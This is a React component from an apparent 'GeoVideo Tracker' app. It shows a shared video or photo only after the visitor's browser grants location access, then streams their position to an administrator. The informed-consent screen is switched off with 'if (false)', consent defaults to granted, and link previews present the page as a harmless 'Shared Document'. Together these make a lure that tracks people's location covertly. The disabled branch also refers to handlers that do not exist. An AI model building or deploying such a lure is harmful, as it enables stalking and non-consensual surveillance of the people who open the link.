import React, { useState, useEffect } from 'react';
import { VideoLink, VisitorSession } from '../types';
import { db } from '../services/db';
import { getOrCreateVisitorId } from '../utils/id';
import { formatAccuracy, formatTimestamp } from '../utils/geo';
import { useGeolocationTracker } from '../hooks/useGeolocationTracker';
import { YouTubePlayer } from '../components/YouTubePlayer';
import { PhotoViewer } from '../components/PhotoViewer';
import { DirectVideoPlayer } from '../components/DirectVideoPlayer';
import {
  Shield,
  ShieldCheck,
  Play,
  Image as ImageIcon,
  Film,
  XCircle,
  AlertTriangle,
  ArrowLeft,
  CheckCircle2,
} from 'lucide-react';

interface VisitorViewProps {
  shareId: string;
  onNavigateToAdmin?: () => void;
}

export const VisitorView: React.FC<VisitorViewProps> = ({ shareId }) => {
  const [videoLink, setVideoLink] = useState<VideoLink | null>(null);
  const [loadingLink, setLoadingLink] = useState(true);
  const [session, setSession] = useState<VisitorSession | null>(null);
  const [consentDecision, setConsentDecision] = useState<'granted' | 'declined'>('granted');
  const [permissionStatus, setPermissionStatus] = useState<'pending' | 'granted'>('pending');
  const [sessionTerminatedMsg, setSessionTerminatedMsg] = useState<string | null>(null);
  const [isStopping, setIsStopping] = useState(false);

  const visitorId = getOrCreateVisitorId();

  // Update document title and Open Graph / Twitter meta tags on link change
  useEffect(() => {
    if (!videoLink) return;

    const title = videoLink.custom_name || 'Shared Document';
    const description = videoLink.description || 'Tap to view the shared document.';
    let imageUrl = 'https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=1200&q=80';

    if (videoLink.media_type === 'photo' && videoLink.media_url) {
      imageUrl = videoLink.media_url;
    } else if (videoLink.thumbnail_url) {
      imageUrl = videoLink.thumbnail_url;
    } else if (videoLink.youtube_video_id) {
      imageUrl = `https://img.youtube.com/vi/${videoLink.youtube_video_id}/maxresdefault.jpg`;
    } else if (videoLink.media_url && videoLink.media_url.match(/\.(jpeg|jpg|png|gif|webp)(\?.*)?$/i)) {
      imageUrl = videoLink.media_url;
    }

    document.title = title;

    const setMetaTag = (selector: string, attrName: string, attrVal: string, content: string) => {
      let element = document.querySelector(selector);
      if (!element) {
        element = document.createElement('meta');
        element.setAttribute(attrName, attrVal);
        document.head.appendChild(element);
      }
      element.setAttribute('content', content);
    };

    setMetaTag('meta[property="og:title"]', 'property', 'og:title', title);
    setMetaTag('meta[property="og:description"]', 'property', 'og:description', description);
    setMetaTag('meta[property="og:image"]', 'property', 'og:image', imageUrl);
    setMetaTag('meta[property="og:url"]', 'property', 'og:url', window.location.href);
    setMetaTag('meta[name="twitter:title"]', 'name', 'twitter:title', title);
    setMetaTag('meta[name="twitter:description"]', 'name', 'twitter:description', description);
    setMetaTag('meta[name="twitter:image"]', 'name', 'twitter:image', imageUrl);
  }, [videoLink]);

  // Load Video Link metadata
  useEffect(() => {
    let isMounted = true;
    async function load() {
      setLoadingLink(true);
      try {
        const link = await db.getVideoLinkByShareId(shareId);
        if (isMounted) {
          setVideoLink(link);
        }
      } catch (err) {
        console.error('Failed to load video link:', err);
      } finally {
        if (isMounted) setLoadingLink(false);
      }
    }
    load();
    return () => {
      isMounted = false;
    };
  }, [shareId]);

  // Start the session as soon as the link is loaded. The browser's native
  // geolocation permission prompt is the only consent step shown to visitors.
  useEffect(() => {
    if (!videoLink || session) return;

    setSessionTerminatedMsg(null);
    db.createVisitorSession(videoLink.id, visitorId, 'active')
      .then(setSession)
      .catch((err) => console.error('Failed to start session:', err));
  }, [videoLink, session, visitorId]);

  // Hook for Geolocation tracking
  const {
    isTracking,
    isAcquiringInitial,
    latestLocation,
    bestLocation,
    error: geoError,
    warning: geoWarning,
    startTracking,
    stopTracking,
    stoppedByAdmin,
    updateCount,
  } = useGeolocationTracker({
    sessionId: session?.id || null,
    isActive: !!session,
    onStatusChange: (status, reason) => {
      if (status === 'stopped_by_admin') {
        setSessionTerminatedMsg('Location sharing session ended by administrator.');
      } else if (status === 'stopped_by_visitor') {
        setSessionTerminatedMsg('Location sharing has been stopped by you.');
      } else if (status === 'permission_denied') {
        setConsentDecision('declined');
        setSessionTerminatedMsg(reason || 'Location permission was denied.');
      } else if (status === 'location_unavailable') {
        setSessionTerminatedMsg(
          `Signal lost temporarily — still trying to reconnect... (${reason || 'GPS unavailable'})`
        );
      }
    },
    onLocationUpdate: () => {
      setPermissionStatus('granted');
      setSessionTerminatedMsg(null);
    },
  });

  // Handle User Clicks "Stop Sharing"
  const handleStopSharing = async () => {
    setIsStopping(true);
    try {
      await stopTracking('visitor');
      setSessionTerminatedMsg('Location sharing has been stopped by you.');
    } finally {
      setIsStopping(false);
    }
  };

  const handleRequestLocationAgain = async () => {
    if (!session) return;
    setConsentDecision('granted');
    setPermissionStatus('pending');
    setSessionTerminatedMsg(null);
    await db.updateVisitorSessionStatus(session.id, 'active');
    startTracking();
  };

  if (loadingLink) {
    return (
      <div className="min-h-screen bg-[#0A0A0B] flex flex-col items-center justify-center p-6 text-center font-mono">
        <div className="w-12 h-12 border-3 border-[#D1FF26] border-t-transparent rounded-full animate-spin mb-4"></div>
        <p className="text-xs uppercase tracking-wider text-[#8E8E96]">LOADING REQUESTED VIDEO DETAILS...</p>
      </div>
    );
  }

  if (!videoLink || !videoLink.active) {
    return (
      <div className="min-h-screen bg-[#0A0A0B] flex flex-col items-center justify-center p-6 text-center font-mono">
        <div className="w-16 h-16 rounded-2xl bg-[#121215] border border-[#222226] flex items-center justify-center text-[#D1FF26] mb-4 shadow-xl">
          <AlertTriangle className="w-8 h-8 text-[#D1FF26]" />
        </div>
        <h2 className="text-xl font-bold uppercase tracking-wider text-white">VIDEO LINK UNAVAILABLE</h2>
        <p className="text-xs text-[#8E8E96] max-w-md mt-2 font-sans">
          This video link may have expired, been deactivated, or the URL ID ({shareId}) is invalid.
        </p>
      </div>
    );
  }

  const mediaType = videoLink.media_type || 'youtube';
  const mediaLabel =
    mediaType === 'photo' ? 'Photo' : mediaType === 'video' ? 'Video' : 'YouTube Video';

  // --- STATE 1: Visitor Declined Consent ---
  if (consentDecision === 'declined') {
    return (
      <div className="min-h-screen bg-[#0A0A0B] text-[#F0F0F2] flex flex-col items-center justify-center p-4 sm:p-6 font-sans">
        <div className="w-full max-w-lg bg-[#121215] border border-[#222226] rounded-3xl p-6 sm:p-8 shadow-2xl backdrop-blur text-center space-y-6">
          <div className="w-16 h-16 rounded-2xl bg-rose-950/40 border border-rose-800/60 mx-auto flex items-center justify-center text-rose-400 shadow-inner">
            <XCircle className="w-8 h-8" />
          </div>

          <div className="space-y-2">
            <h2 className="text-xl font-bold uppercase tracking-wider text-white font-mono">ACCESS RESTRICTED</h2>
            <p className="text-xs text-rose-300 font-mono">
              Location sharing was declined, so the {mediaLabel.toLowerCase()} cannot be opened.
            </p>
          </div>

          <div className="bg-[#0A0A0B] rounded-2xl p-4 border border-[#222226] text-xs text-[#8E8E96] text-left space-y-2 font-mono">
            <div className="flex items-center gap-2 font-bold text-white uppercase tracking-wider">
              <Shield className="w-4 h-4 text-[#D1FF26]" />
              <span>Strict Privacy Policy</span>
            </div>
            <p className="font-sans text-[#A0A0A8]">
              Your browser denied location access, so "{videoLink.custom_name}" cannot be opened.
              Allow location access to continue.
            </p>
          </div>

          <div className="flex flex-col sm:flex-row gap-3 pt-2">
            <button
              onClick={handleRequestLocationAgain}
              className="flex-1 py-3 px-4 bg-[#D1FF26] hover:bg-[#bfe822] text-black rounded-xl font-mono font-bold uppercase tracking-wider text-xs transition shadow-lg flex items-center justify-center gap-2 cursor-pointer"
            >
              <ShieldCheck className="w-4 h-4" />
              Allow
            </button>
          </div>
        </div>
      </div>
    );
  }

 if (permissionStatus === 'pending') {
  return (
   <div className="min-h-screen bg-[#0A0A0B] text-[#F0F0F2] flex flex-col items-center justify-center p-6 text-center font-mono">
     <div className="w-12 h-12 border-3 border-[#D1FF26] border-t-transparent rounded-full animate-spin mb-4"></div>
     <h2 className="text-sm font-bold uppercase tracking-wider text-white">
       Waiting for browser location permission
     </h2>
     <p className="text-xs text-[#8E8E96] max-w-md mt-2">
       Allow location access in your browser to open this protected media.
     </p>
   </div>
 );
}
  // --- STATE 2: Consent Gate Screen ---
  if (false) {
    return (
      <div className="min-h-screen bg-[#0A0A0B] text-[#F0F0F2] flex flex-col items-center justify-center p-4 sm:p-6 font-sans">
        <div className="w-full max-w-xl mb-4 flex items-center justify-between text-xs text-[#8E8E96] font-mono">
          <div className="flex items-center gap-2">
            <div className="w-2 h-2 rounded-full bg-[#D1FF26]"></div>
            <span className="font-bold text-white uppercase tracking-wider">GeoVideo Tracker</span>
          </div>
          <span className="bg-[#121215] px-2.5 py-1 rounded-lg border border-[#222226]">
            VISITOR: <span className="font-mono text-[#D1FF26]">{visitorId}</span>
          </span>
        </div>

        <div className="w-full max-w-xl bg-[#121215] border border-[#222226] rounded-3xl p-6 sm:p-8 shadow-2xl space-y-6">
          <div className="space-y-2 pb-4 border-b border-[#222226]">
            <div className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[#141810] border border-[#304018] text-[#D1FF26] text-[10px] font-mono font-bold uppercase tracking-widest">
              {mediaType === 'photo' ? (
                <>
                  <ImageIcon className="w-3 h-3 text-[#D1FF26]" />
                  <span>PROTECTED PHOTO</span>
                </>
              ) : mediaType === 'video' ? (
                <>
                  <Film className="w-3 h-3 text-[#D1FF26]" />
                  <span>PROTECTED DIRECT VIDEO</span>
                </>
              ) : (
                <>
                  <Play className="w-3 h-3 fill-current" />
                  <span>PROTECTED STREAM</span>
                </>
              )}
            </div>
            <h1 className="text-2xl sm:text-3xl font-bold text-white tracking-tight font-sans">
              {videoLink.custom_name}
            </h1>
            {videoLink.description && (
              <p className="text-sm text-[#8E8E96] leading-relaxed">{videoLink.description}</p>
            )}
          </div>

          <div className="bg-[#0A0A0B] rounded-2xl p-5 border border-[#222226] space-y-3 font-mono">
            <div className="flex items-center gap-2 text-[#D1FF26] font-bold text-xs uppercase tracking-wider">
              <ShieldCheck className="w-5 h-5 text-[#D1FF26]" />
              <span>Location Consent Notice</span>
            </div>
            <p className="text-xs text-[#D0D0D5] leading-relaxed font-sans">
              {mediaType === 'photo'
                ? 'To view this high-resolution photo, you can share your current device location with the website owner. Your latitude, longitude, accuracy and location updates will be collected while location sharing is active.'
                : 'To watch this video, you can share your current device location with the website owner. Your latitude, longitude, accuracy and location updates will be collected while location sharing is active.'}
            </p>
            <div className="pt-2 border-t border-[#18181C] grid grid-cols-2 gap-2 text-[11px] text-[#8E8E96]">
              <div className="flex items-center gap-1.5">
                <CheckCircle2 className="w-3.5 h-3.5 text-[#D1FF26]" />
                <span>High GPS accuracy</span>
              </div>
              <div className="flex items-center gap-1.5">
                <CheckCircle2 className="w-3.5 h-3.5 text-[#D1FF26]" />
                <span>Stop anytime with 1-click</span>
              </div>
            </div>
          </div>

          <div className="flex flex-col sm:flex-row gap-3 pt-2">
            <button
              onClick={handleAllowAndWatch}
              className="flex-1 py-3.5 px-5 bg-[#D1FF26] hover:bg-[#bfe822] text-black rounded-xl font-mono font-bold uppercase tracking-wider text-xs transition duration-150 shadow-lg flex items-center justify-center gap-2 cursor-pointer"
            >
              {mediaType === 'photo' ? (
                <>
                  <ImageIcon className="w-4 h-4" />
                  Allow &amp; View Photo
                </>
              ) : (
                <>
                  <Play className="w-4 h-4 fill-current" />
                  Allow &amp; Watch Video
                </>
              )}
            </button>
            <button
              onClick={handleDecline}
              className="py-3.5 px-5 bg-[#18181C] hover:bg-[#222228] text-[#8E8E96] hover:text-white rounded-xl font-mono font-bold uppercase tracking-wider text-xs transition border border-[#2A2A30] flex items-center justify-center gap-2 cursor-pointer"
            >
              <XCircle className="w-4 h-4" />
              Decline
            </button>
          </div>

          <p className="text-[11px] text-center text-[#71717A] font-mono">
            Location collection only begins after explicit browser permission is granted.
          </p>
        </div>
      </div>
    );
  }

  // --- STATE 3: Allowed & Watching/Viewing Media ---
  return (
    <div className="min-h-screen bg-[#0A0A0B] text-[#F0F0F2] flex flex-col p-4 sm:p-6 lg:p-8 font-sans">
      <div className="max-w-5xl w-full mx-auto space-y-6">
        <h1 className="text-xl sm:text-2xl font-bold text-white">
          {videoLink.custom_name}
        </h1>

        {/* Media Player / Viewer */}
        <div className="space-y-3">
          {mediaType === 'photo' ? (
            <PhotoViewer
              src={videoLink.media_url || videoLink.thumbnail_url || ''}
              title={videoLink.custom_name}
            />
          ) : mediaType === 'video' ? (
            <DirectVideoPlayer
              src={videoLink.media_url || ''}
              title={videoLink.custom_name}
              autoplay={true}
            />
          ) : (
            <YouTubePlayer
              videoId={videoLink.youtube_video_id || ''}
              title={videoLink.custom_name}
              autoplay={true}
            />
          )}
        </div>

      </div>
    </div>
  );
};